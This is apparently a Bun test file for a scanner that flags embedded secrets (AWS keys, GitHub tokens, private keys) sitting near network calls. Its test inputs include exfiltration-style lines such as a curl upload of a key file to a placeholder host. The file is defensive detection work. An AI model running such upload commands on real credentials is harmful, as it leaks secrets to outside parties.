import { expect, test } from "bun:test";
import { embeddedSecrets } from "./embedded-secret.ts";
import { AWS_KEY, GITHUB_TOKEN, KEY_BODY, PRIVATE_KEY } from "./test-secrets.ts";

test("a network call more than five lines away leaves the secret at warn", () => {
  const text = `key=${AWS_KEY}\n\n\n\n\n\ncurl https://x.invalid\n`;
  expect(embeddedSecrets(text, [7])?.severity).toBe("warn");
  expect(embeddedSecrets(text, [6])?.severity).toBe("critical");
});

test("the strongest secret is reported with the match count", () => {
  expect(embeddedSecrets(`a=${GITHUB_TOKEN}\nb=${AWS_KEY}\n`, [7])).toEqual({
    severity: "critical",
    line: 2,
    detail: "AWS access key AKIA…Q2LM (network call on line 7) (2 matches)",
  });
});

test("a private key body shorter than 64 characters is not a key", () => {
  const short = PRIVATE_KEY.replace(KEY_BODY, KEY_BODY.slice(0, 40));
  expect(embeddedSecrets(short, [])).toBeUndefined();
});

test("a send after a private key's END line counts from that line", () => {
  const key = PRIVATE_KEY.replace(KEY_BODY, Array(12).fill(KEY_BODY).join("\n"));
  expect(embeddedSecrets(`${key}\ncurl -T k https://x.invalid\n`, [15])).toEqual({
    severity: "critical",
    line: 1,
    detail: "OPENSSH PRIVATE KEY block (14 lines) (network call on line 15)",
  });
});

test("a private key body longer than 20,000 characters is not a key", () => {
  const long = PRIVATE_KEY.replace(KEY_BODY, Array(400).fill(KEY_BODY).join("\n"));
  expect(embeddedSecrets(long, [])).toBeUndefined();
});

test("the nearest send is reported, and a tie goes to the earlier one", () => {
  const text = `\n\n\n\nkey=${AWS_KEY}\n`;
  expect(embeddedSecrets(text, [1, 3, 7, 9])?.detail).toBe(
    "AWS access key AKIA…Q2LM (network call on line 3)",
  );
  expect(embeddedSecrets(text, [9, 6, 1])?.detail).toBe(
    "AWS access key AKIA…Q2LM (network call on line 6)",
  );
});

test("repeated secrets and sends take linear time", () => {
  const text = `k=${AWS_KEY}\ncurl https://x.invalid\n`.repeat(20_000);
  const sends = Array.from({ length: 20_000 }, (_, i) => 2 * i + 2);
  const started = performance.now();
  expect(embeddedSecrets(text, sends)?.detail).toBe(
    "AWS access key AKIA…Q2LM (network call on line 2) (20000 matches)",
  );
  expect(performance.now() - started).toBeLessThan(1000);
});
